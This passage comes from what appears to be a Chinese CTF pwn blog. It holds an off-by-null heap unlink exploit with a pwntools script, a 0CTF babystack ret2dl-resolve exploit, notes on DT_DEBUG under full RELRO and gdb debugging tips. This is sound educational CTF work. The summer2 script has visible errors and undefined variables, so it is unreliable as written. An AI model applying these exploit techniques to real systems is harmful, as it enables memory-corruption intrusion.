这里我们需要用到其他类型bin chunk的辅助。 我们可以很容易地控制fd_nextsize指向某个smallbin chunkC，而这个smallbin chunkC的fd也指向堆上的某个地址。我们又可以通过修改这个chunkC的fd指针使得它指向fake chunk。这样一来我们利用 chunkC充当中间角色，绕了一圈使得我们目的达成的同时也没有被检测绊住。 然后来看实际操作。 1add(0x28,p64(0) + p64(0x530) + p64(chunkC_addr))#fake chunk 先申请一个chunkB，用来构造fake chunk的size和fd指针。这里fake chunk fd还只是指向chunkC，我们需要修改chunkC的fd指针使它指向fake chunk。 修改chunk header需要利用到悬垂指针。我们下一步应该是构造出chunkC的悬垂指针。 比如从 small bin中拿出的chunk，如果其bin中有多个chunk的话，那么拿出来的chunk的bk上必定残留了指针，因此可以进行覆盖。 这里稍微有一些能讲的基础知识。还是参见extra吧。 123456789add(0x28,b&#x27;a&#x27;) #24add(0x28,b&#x27;a&#x27;) #25add(0x28,b&#x27;a&#x27;) #26add(0x28,b&#x27;a&#x27;) #27add(0x600,b&#x27;a&#x27;) #28,off by nullfor i in range(7): add(0x28,&#x27;tcache&#x27;)for i in range(7): delete(23 + i)#填充tcache 多申请一些chunk。 123456delete(24)delete(25)#将chunk24，25free到fastbinadd(0x400,b&#x27;aa&#x27;)#28，smallbin#申请chunk28后fastbin里的两个chunk被放入small bin。这里的相关机制可以来看看extra。add(0x28,p64(fake_chunk_addr))#24，再次申请，堆上遗留了bk指针，可以直接覆盖为目标地址 这样一来我们成功使得fd位指向fake chunk，并绕过了FD-&gt;bk = p 然后是bk_nextsize = p的绕过： 因为bk_nextsize本身指向chunkA，我们还是需要伪造它使得bk_nextsize指向chunkA + 0x10。 对于这个检测我们依旧要利用到别的chunk的帮助 1234567891011121314for i in range(7): add(0x28,&#x27;tcache&#x27;)for i in range(7): delete(28 + i)#填充tcache add(0x28, &#x27;a&#x27;)*#23,Tcachefree(20)free(23) for i in range(7): add(0x28, &#x27;a&#x27;)add(0x28, p64(fake_chunk_addr)) 然后进行unlink。 unlink的触发实际上只需要用off by null向下一个chunk溢出空字节，再free被溢出的chunk就行 123add(0x28,b&#x27;aa&#x27;)edit(28,b&#x27;a&#x27;*0x20 + p64(0x520))delete(28) 整个过程的示意图如下：其中chunk ptr指large bin残留的指针。 完整exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107from pwn import *r = precess(&#x27;./summer2&#x27;)context.log_level = &#x27;debug&#x27;libc = ELF(&#x27;./libc-2.29.so&#x27;)unlink_addr = 0x6024b0free_got_addr = 0x4036E8next_chunk_addr = unlink_addrdef add(size,content): r.sendline(&quot;1&quot;) r.sendafter(&quot;:&quot;,str(size)) r.sendafter(&quot;:&quot;,content)def delete(idx): r.sendline(&quot;2&quot;) r.sendafter(&quot;:&quot;,str(idx))def show(idx): r.sendline(&quot;3&quot;) r.sendafter(&quot;:&quot;,str(idx))def edit(idx,content): r.sendline(&quot;4&quot;) r.sendafter(&quot;:&quot;,str(idx)) r.sendafter(&quot;:&quot;,str(content))def dbg(): gdb.attach(r) pause()#----------------Tcache-------------------for a in range(7): add(0x1000,b&#x27;fill&#x27;) delete(a)for b in range(7): add(0x1020,b&#x27;fill&#x27;) delete(b)for c in range(7): add(0x20,b&#x27;fill&#x27;) delete(c)#-----------chunk constrution--------------add(0x500,b&#x27;largebin chnuk0&#x27;)#chunk21add(0x20,b&#x27;top&#x27;)#chunk22delete(21)add(0x1000,b&#x27;functional gadgets&#x27;)#chunk23,to push the chunk21 to largebin#-------fake chunk construction------------add(0x28,p64(0x530) + p64(chunkC_addr))#fake chunk add(0x28,b&#x27;a&#x27;) #24add(0x28,b&#x27;a&#x27;) #25add(0x28,b&#x27;a&#x27;) #26add(0x28,b&#x27;a&#x27;) #27add(0x600,b&#x27;a&#x27;) #28,off by nullfor i in range(7): add(0x28,&#x27;tcache&#x27;)for i in range(7): delete(23 + i)#填充tcache#-------FD-&gt;bk = p-------------------------delete(24)delete(25)#将chunk24，25free到fastbinadd(0x400,b&#x27;aa&#x27;)#28，smallbin#申请chunk28后fastbin里的两个chunk被放入small bin。add(0x28,p64(fake_chunk_addr))#24，再次申请，堆上遗留了bk指针，可以直接覆盖为目标地址#-------BK-&gt;fd = p-------------------------for i in range(7): add(0x28,&#x27;tcache&#x27;)for i in range(7): delete(28 + i)#填充tcache add(0x28, &#x27;a&#x27;)*#23,Tcachefree(20)free(23) for i in range(7): add(0x28, &#x27;a&#x27;)add(0x28, p64(fake_chunk_addr))#-------unlink-----------------------------add(0x28,b&#x27;aa&#x27;)edit(28,b&#x27;a&#x27;*0x20 + p64(0x520))delete(28)#-------leak-------------------------------show(21)free_addr = u64(r.recvuntil(&quot;DOWNLOAD SUCCESFULLY&quot;)[:-5].ljust(8, &quot;\\x00&quot;))libc_base = free_addr - libc.symbols[&#x27;free&#x27;]print(hex(libc_base))system_addr = libc_base + libc.symbols[&#x27;system&#x27;]edit(1, p64(system_addr))show(1)delete(0)r.interactive() 4)总结不管是level0还是level1、level2，其实都是off by one庞大利用方式中比较基础的点。 level2的思路很有趣。 不管怎样万变不离其中，off by one/null可以导致一个字节的的溢出以修改chunk header，从而触发各种各样的漏洞利用。 5）军训？考核？大冒险！原本是计划三道题。一道full relro的ret2dl，一道多线程或者xtea加密的re，一道简单off by one（就是summer）。 在军训一天后觉得出三道题，这确实是不可能的事。累倒不累，主要是时间都是碎片化的不好利用。 当时考核发布的时候我们都觉得时间是充足的，能先花时间学考点而不是研究怎么做考核。实际上考核一公布我就写了summer的大概框架，之前没有怎么从源码层面上阅读堆题，甚至那个时候也是刚刚接触堆半个月，所以写得很艰难，大概花了一周的时间把程序完善。后来发现了一个很严重的非预期，觉得自己有点急于求成，对堆一知半解的就想出堆题是不是有点不识好歹了，就暂时放下了考核而开始研究堆题的考点。这期间我也一直认为军训完还有充足的时间来完善题目。 再后来三道题变成了一道题。 很遗憾没有在考核期间完成full relro的ret2dl。。不过有没有作为考核完成也不是特别重要了，我已经部分翻译了原文相关的部分，打算暑假认真调试一下。。。 大概七号的时候就完成了level0和1，本来最初计划就是这两个level的，但是不知道为什么想不开加了level2，学得很艰难。并且 感觉写的支离破碎的，说白了我的知识面不足以支撑我完全理解这个检测的绕过方法，所以一些东西写得十分离奇。比如通篇几乎没有用到edit功能，因为参考的wp的原题都是没有这个功能的。 很让我恼火的就是我对于largebin、smallbin还有Tcache的机制不甚熟悉，而解题中涉及到的堆指针覆写的很多姿势实际上都是基于这些bin特有的机制。 说实话有点惭愧，大一上我干了啥呢。啥也没干。 硬着头皮看🐟最早分享的长亭二进制入门课，那时我愿称之为天书。 做签到栈溢出，复制别人的exp打，搞半天都连接失败，死也打不通。 就跟忘记了当初为什么要学习二进制一样，我也忘记了当时为什么我要每天晚上看那个nep的直播课，忘记做考核的那种不做出来就跳楼的决心来自哪里。 相似地，我还忘记了我为什么要学pwn，而不是我比较憧憬的游戏安全。 就好像一件事情的发生通常拥有直接原因和根本原因，而我的一系列行径是没有直接原因的，并没有什么很直接的驱动力或者很特别的理由。 这是一件非常奇怪的事情。通常来说我是一个比较有明确目标的人，但是在这种关键的事情上我的选择却不是由我本人决断的。 这果然是一件非常奇怪的事情，硬要类比，可以来一句经典名言：” 爱也如此。” 6）extra（慎重观看）extra部分。 多为调试时遇到的环境问题或者一些懂的都懂不必多说的基础知识。 但是怕被说水考核就加上了。 pps：平时文档写多了总有一种奇怪的引导的语气。。。要多具体有多具体的那种，所以废话以及不必要的操作巨多，慎重观看。 ppps：只要我的解题的思路的正文部分足够简略清爽，就不会有人说我拖泥带水（） 调试部分1.1-解决gdb无法查看heap等信息的问题指定libc加载后进行调试。发现gdb无法显示当前的堆块以及链表信息。 123456789heaheap: This command only works with libc debug symbols.They can probably be installed via the package manager of your choice.See also: https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.htmlE.g. on Ubuntu/Debian you might need to do the following steps (for 64-bit and 32-bit binaries):sudo apt-get install libc6-dbgsudo dpkg --add-architecture i386sudo apt-get install libc-dbg:i386 1）通过pwntools加载带有dbg符号的libc加载带有degub_symbols的libc，一般来说是手动添加或者加载带有调试符号的libc，glibc官方文档对此进行了说明。 后者可以从清华镜像站下载。 这里花了一些时间重新了解了一写glibc链接库的一些知识。 更改后的脚本如下 1234r = process([&quot;./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/ld-2.23.so&quot;, &quot;./summer_1&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/libc.so.6&quot;&#125;)context.log_level = &#x27;debug&#x27;libc = ELF(&#x27;./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)elf = ELF(&#x27;./summer_1&#x27;) 执行失败。报错是 doesn&#39;t have any GOT symbols, skipping PLT 暂未找到解决方案。 2）手动查看堆内存信息根据内存分布找到堆上数据的地址，然后通过x/gx命令手动查看。 那么如何找到堆数据具体的内存地址？ 打开一个简单的堆题来参考。 可以看到heap头地址在B008，比bss_end足足高了FA5。 所以并没有找到什么联系捏。。。 3）手动编译degub版本的libc下载相应的glibc源码并编译。 编译时需要开启debug 1234mkdir build &amp;&amp; cd biuld../configure --prefix = /usr/local/glibc-2.29 --enable-debug = yesmake -j4 &amp;&amp; sudo make install#64 bit 编译完成后可以通过链接该库直接编译程序源代码。 如果需要用该版本链接库执行已编译的程序的话可以替换二进制文件解释器路径，但是必须修改程序二进制文件的程序头，将我们需要的ld路径写入。ld路径与libc中的ld路径必须匹配，否则会出错，导致系统指令无法执行。 然后更改LD_PRELOAD环境变量 1.2-解决libc.so.6相关报错问题上述脚本执行后，python3报错，原因大致是没有libc.so.6文件。 查看对应文件夹发现情况属实。 解决方案是手动创建对应的lib.so.6文件。 1.3-附加调试后的地址随机化问题。一个很奇怪的问题，环境是ubuntu18.04，libc默认2.27. gdb直接调试程序，内存地址是固定的，但是一旦利用脚本进行附加调试就会出现地址随机化。 附加调试下的heap 直接调试下的heap 我怀疑是gdb的配置出了点什么毛病，这个ubuntu18环境是我之前随便装的，没怎么管。 解决方案： 1：暂无 2 : 无视问题，摁调。 基础知识2.1-Tcache的安全问题2.27版本下相对于2.23新增了tcache机制。 Tcache为每一个线程创建缓存，即内含一些堆块，每个线程分配64个bins，一个bins最多存7个chunk，64位下chunk的大小以16字节递增，也就是最大1032b，所以Tcache并不能存放large bin。， 释放堆块时，如果chunk大小符合要求就放入Tcache，直到Tcache被填满，这个操作是优先于fastbin或者其他操作的。 分配堆块时，如果从fastbin返回了一个合适的chunk，那么fastbin中的其他chunk都会被放入Tcache（除非被装满），smallbin同理。 以及，分配堆块时，如果Tcache中有合适的chunk，就从其中取出来，这也是优先于其他bin的。 可以看出Tcache的优先级比较高，这就导致很多有效的检测将被跳过，在提升执行效率的同时也大大提升了安全风险。 虽然但是，本题的2.27版本不涉及Tcache的安全漏洞利用。只需要将tcache填满就行。 123for i in range(7) add(248,b&#x27;fill&#x27;) free（i） Ps:每个size的Tcache最多有7个，也就是连续申请7个0xf8的chunk再释放就能把tcache填满。 2.2-chunk的size的内存对齐问题题目中我们申请了四个size为0xF8的chunk 申请后的heap信息如下 1234567891011121314Allocated chunk | PREV_INUSE#截取了chunk0的信息，地址问题承接上文。Addr: 0x1b39250Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x1b39270Size: 0x101----------------------------------------------------------------pwndbg&gt; x/50gx 0x1b392500x1b39250: 0x0000000000000000 0x00000000000000210x1b39260: 0x0000000001b39280 0x00000000000000000x1b39270: 0x0000000000000000 0x00000000000001010x1b39280: 0x0000000a61616161 0x00000000000000000x1b39290: 0x0000000000000000 0x0000000000000000 可以看到没有什么太大的差错。 然而针对实际情况，我们提出两个问题。 1）为什么0xf8实际是0x101？ 0xF8 + 0x8 = 0x100（ps：101中的最低位的1是prev inuse位） 也就是实际比我们申请的多了八个字节。 那么是不是我们申请的每个堆块的实际大小都会比原来多0x8呢？ 具体来试一试。这次我们申请0xf0大小的chunk。 123Allocated chunk | PREV_INUSEAddr: 0x908270Size: 0x101#chunk的size还是0x101，相当于这次增加了0x16 注意到两个值一个16字节对齐，另一个是16的倍数再加了八字节。 事实上就是malloc的对齐机制。机制比较完善的编译器会为我们malloc的chunksize自动对进行内存对齐。比如说malloc 0x15的chunk，内存中就是0x21。0x21的来源就是malloc自动为0x15进行内存对齐。 120x12a5270: 0x0000000000000000 0x00000000000000210x12a5280: 0x0000000a61616161 0x0000000000000000 回到问题本身，那为什么我们要专门申请16+8的size呢？ 众所周知，ptmalloc中有一个神奇的节约内存空间的内存复用机制： 众众所周知，malloc规定，只有当本chunk的前一个chunk为free状态的时候，本chunk的prev size才是有意义的，如果本chunk的前一个chunk处于allocated状态，那么即不使用本chunk的prev size。 基于这种规定，当处于alocated状态的prev chunk越来越多，势必会造成一些浪费，所以malloc又规定，如果本chunk申请时size大小是16的倍数，那么就在它前面增加prev size位和size位，如果是16x+8的形式，那么只在chunk前增加size位，prev size位则储存在prev chunk的最后八位。也就是我们一开始碰见的情况。 因此我们要对chunk进行off by null，那么它的prev size位肯定是要可控制的，所以这里我们就需要申请16+8，将prev size分配到上一个chunk中供我们篡改。 2）chunk的size大小问题，有很多size供我们选择，为什么偏偏要是0xf8？ 解决了第一个问题，第二个问题其实很好解释。首先前文说到的，要空字节溢出，size就不能太小。其次size是16的倍数+8。满足了这两个条件只要不是大得离谱（别跑去large bin或者mmap了），随便啥size都可以，但是太大也不好掌控还浪费空间。 2.3-unlink？不管是2.23还是2.27，unlink最终目标都是通过堆叠来修改chunk指针的内容。 那为什么是unlink，而不是其他方法？ 首先来回顾一下unlink的利用过程。 在有检测的情况下，绕过检测是利用unlink的较为关键的一步。 检测使得我们不能直接修改next chunk 的fd 和bk后进行unlink。绕过的方式也有。fd和bk只要满足以下条件，则会触发target chunk的unlink。 12fakeFD -&gt; bk == P` ，等价于 `*(fakeFD + 12) == PfakeBK -&gt; fd == P`` ，等价于`*(fakeBK + 8) == P 触发后，操作如下 fakeFD -&gt; bk = fakeBK &lt;=&gt; *(fakeFD + 12) = fakeBK fakeBK -&gt; fd = fakeFD &lt;=&gt; *(fakeBK + 8) = fakeFD 如果*(fakeFD + 12)=*(fakeBK + 8)=*P 那么也就是 *P = P - 12 这样p的地址就向下偏移了0x12个字节。 设置*(fakeFD + 12)=*(fakeBK + 8)=*P的方法也很简单，只需要fake_fd = nextchunkptr - 0x12，fake_ bk = nextchunk -0x8就行。 虽然这样大费周章也只是让p地址下移了12，但是这0x12字节足够我们构造堆叠了。 ps：可以类比数学证明题来理解这段绕过的分析思路。从使检测成立的结果一步步逆推，这里使用的就是”根据结果推原因”，属于“分析法” 2.4-largebin其实了解large bin或者largebin attack前还需要了解unsortedbin，但是unsortedbin感觉不是重点。 稍微介绍本题中关于largebin chunk的一些比较关键的数据构。 为了加快检索速度，largebin链表增加了fd_nextsize,bk_nextsize指针，用于指向第一个与自己大小不同的chunk（所以只有当largebin中有两个大小不同的chunk时，这两个指针才会被修改)。如果 large bin 中仅有一个 chunk，那么该 chunk 的两个 nextsize 指针都会指向自己。 largebin中的chunk大致结构如下","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"0CTF_2018_babystack","slug":"0CTF2018-babystack","date":"2021-08-02T03:22:53.000Z","updated":"2021-08-03T07:34:02.749Z","comments":true,"path":"2021/08/02/0CTF2018-babystack/","link":"","permalink":"https://fuurinko.github.io/2021/08/02/0CTF2018-babystack/","excerpt":"","text":"1)review作为ret2dl的复习题。 2）exploitation溢出0x28+0x4字节，但是由于rop空间太小需要栈迁移。 并且没有aslr，relro为partial。 非常典型的ret2dl。 可以直接用roputils做 1234567891011121314151617181920212223242526272829303132333435363738#coding:utf-8import sysimport roputilsfrom pwn import *offset = 44readplt = 0x08048300bss = 0x0804a020vulFunc = 0x0804843Bp = process(&#x27;./babystack&#x27;)def getReloc(elf, base): jmprel = elf.dynamic(&#x27;JMPREL&#x27;) relent = elf.dynamic(&#x27;RELENT&#x27;) addr_reloc, padlen_reloc = elf.align(base, jmprel, relent) reloc_offset = addr_reloc - jmprel return reloc_offsetrop = roputils.ROP(&#x27;./babystack&#x27;)addr_bss = rop.section(&#x27;.bss&#x27;)# step1 : write sh &amp; resolve struct to bssbuf1 = b&#x27;A&#x27; * offset #44buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)p.send(buf1)buf2 = rop.string(&#x27;/bin/sh&#x27;)buf2 += rop.fill(20, buf2)buf2 += rop.dl_resolve_data(addr_bss+20, &#x27;system&#x27;)buf2 += rop.fill(100, buf2)p.send(buf2)#step2 : use dl_resolve_call get system &amp; system(&#x27;/bin/sh&#x27;)buf3 = b&#x27;A&#x27;*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)p.send(buf3)p.interactive()","categories":[],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]},{"title":"ret2dl_advanced","slug":"ret2dl_advanced","date":"2021-08-02T03:22:53.000Z","updated":"2021-08-02T08:11:22.155Z","comments":true,"path":"2021/08/02/ret2dl_advanced/","link":"","permalink":"https://fuurinko.github.io/2021/08/02/ret2dl_advanced/","excerpt":"","text":"ret2dl_advanced1)review当FULL RELRO保护开启时，通过 dl_run_time来获取libc基址的方式几乎无解。 但是我们仍然能够找到某种方式来getshell。 相关论文中给出一种解决方案，即通过dt_bug入口找到突破点。 (Ps:为什么找不到相关的中文文章) 2）dt_dbg？dt_dbg这个概念实际上并不新鲜，简单来说它可以被包含在libc.so文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个libc.so文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。 dt_dubug用于指向type_r_debug这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。 此外，这个结构体的r_map域保存了指向link_map的链接表表头的指针。 也就是dt_dbg指向type_r_debug，且type_r_debug维护了指向link_map的指针。 r_debug具体代码如下: 1234567891011121314151617181920/* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable&#x27;s dynamic section has a DT_DEBUG element, the run-time linker sets that element&#x27;s value to the address where this structure can be found. */struct r_debug &#123; int r_version; /* Version number for this protocol. */ struct link_map *r_map; /* Head of the chain of loaded objects. */ /* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */ ElfW(Addr) r_brk; enum &#123; /* This state value describes the mapping change taking place when the `r_brk&#x27; address is called. */ RT_CONSISTENT, /* Mapping change is complete. */ RT_ADD, /* Beginning to add a new object. */ RT_DELETE /* Beginning to remove an object mapping. */ &#125; r_state; ElfW(Addr) r_ldbase; /* Base address the linker is loaded at. */ &#125;; 实操一遍 随便写一个无output的栈溢出。 12345678fur1n@ubuntu:~/pwn$ readelf -d ret2dlDynamic section at offset 0xdb8 contains 27 entries: Tag Type Name/Value... 0x0000000000000015 (DEBUG) 0x0 在没有运行的时候dt_dbg为空。 在关闭aslr的情况下找到dt_debug并不困难。 gdb使用elfheader命令查看相关elfheader的地址，可以找到.dynamic 段的地址。 123pwndbg&gt; x/50gx 0x600e20...0x600ee0: 0x0000000000000015 0x00007ffff7ffe140 0x00007ffff7ffe140也就是dt_debug指向的r_debug的地址。 123456789101112pwndbg&gt; x/20gx 0x00007ffff7ffe1400x7ffff7ffe140 &lt;_r_debug&gt;: 0x0000000000000001 0x00007ffff7ffe1700x7ffff7ffe150 &lt;_r_debug+16&gt;: 0x00007ffff7de3f40 0x00000000000000000x7ffff7ffe160 &lt;_r_debug+32&gt;: 0x00007ffff7dd3000 0x00000000000000000x7ffff7ffe170: 0x0000000000000000 0x00007ffff7ffe7000x7ffff7ffe180: 0x0000000000600e20 0x00007ffff7ffe7100x7ffff7ffe190: 0x0000000000000000 0x00007ffff7ffe1700x7ffff7ffe1a0: 0x0000000000000000 0x00007ffff7ffe6e80x7ffff7ffe1b0: 0x0000000000000000 0x0000000000600e200x7ffff7ffe1c0: 0x0000000000600f00 0x0000000000600ef00x7ffff7ffe1d0: 0x0000000000000000 0x0000000000600ea0 r_debug维护的第一个结构体，也就是link_map地址，即0x00007ffff7ffe170 10x7ffff7ffe140 &lt;_r_debug&gt;: 0x0000000000000001 0x00007ffff7ffe170 这样我们就从dt_debug找到了link_map的地址。 虽然但是。 只是找到link_map没啥用。 我们的最终目的还是寻找到dl_runtime_resolve函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。 能从动态链接库中找到dl_runtime_resolve函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到dl_runtime_resolve函数地址，那么问题就迎刃而解了。 那么如何寻找呢？ 实际比较简单（无aslr的情况），只要根据link_map的结构依次顺下来就好了。 上一个section我们找到了link_map的地址，接下来我们通过link_map逐步找到 dl_runtime_resolve。 首先我们找到libc.so.6文件。 123456789101112131415161718192021pwndbg&gt; x/20gx 0x00007ffff7ffe1700x7ffff7ffe170: 0x0000000000000000 0x00007ffff7ffe7000x7ffff7ffe180: 0x0000000000600e20 0x00007ffff7ffe710---pwndbg&gt; x/20gx 0x00007ffff7ffe7000x7ffff7ffe700: 0x0000000000000000 0x00000000000000000x7ffff7ffe710: 0x00007ffff7ffb000 0x00007ffff7ffebb0---pwndbg&gt; x/s 0x00007ffff7ffebb00x7ffff7ffebb0: &quot;linux-vdso.so.1&quot;---pwndbg&gt; x/10gx 0x00007ffff7ffe7100x7ffff7ffe710: 0x00007ffff7ffb000 0x00007ffff7ffebb00x7ffff7ffe720: 0x00007ffff7ffb3a0 0x00007ffff7fe2000---pwndbg&gt; x/10gx 0x00007ffff7fe20000x7ffff7fe2000: 0x00007ffff79e2000 0x00007ffff7ffedd0---pwndbg&gt; x/s 0x00007ffff7ffedd00x7ffff7ffedd0: &quot;/lib/x86_64-linux-gnu/libc.so.6&quot; 即0x00007ffff7ffedd0。 0x3即GOT[]入口 1234pwndbg&gt; x/30gx 0x00007ffff7dccb80...0x7ffff7dccc30: 0x0000000000000003 0x00007ffff7dcd000 找到GOT[3] 123pwndbg&gt; x/5gx 0x00007ffff7dcd0000x7ffff7dcd000: 0x00000000003eab80 0x00007ffff7fe20000x7ffff7dcd010: 0x00007ffff7dea8f0 0x00007ffff7b70a10 123456789101112131415pwndbg&gt; xinfo 0x00007ffff7dea8f0Extended information for virtual address 0x7ffff7dea8f0: Containing mapping: 0x7ffff7dd3000 0x7ffff7dfc000 r-xp 29000 0 /lib/x86_64-linux-gnu/ld-2.27.so Offset information: Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0 Containing ELF sections: .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0 3）exploitation在无aslr并已经获取到dl_runtime_resolve的情况下的利用和patial relro相似。 有aslr的情况。。 我也不会。 4)refrence通过DT_DEBUG来获得各个库的基址 How the ELF Ruined Christmas Finding link_map and _dl_runtime_resolve() under full RELRO ————————————————tbc——————————————————-","categories":[],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]}],"categories":[],"tags":[{"name":"daliy_challanges","slug":"daliy-challanges","permalink":"https://fuurinko.github.io/tags/daliy-challanges/"},{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"},{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"},{"name":"other","slug":"other","permalink":"https://fuurinko.github.io/tags/other/"},{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]}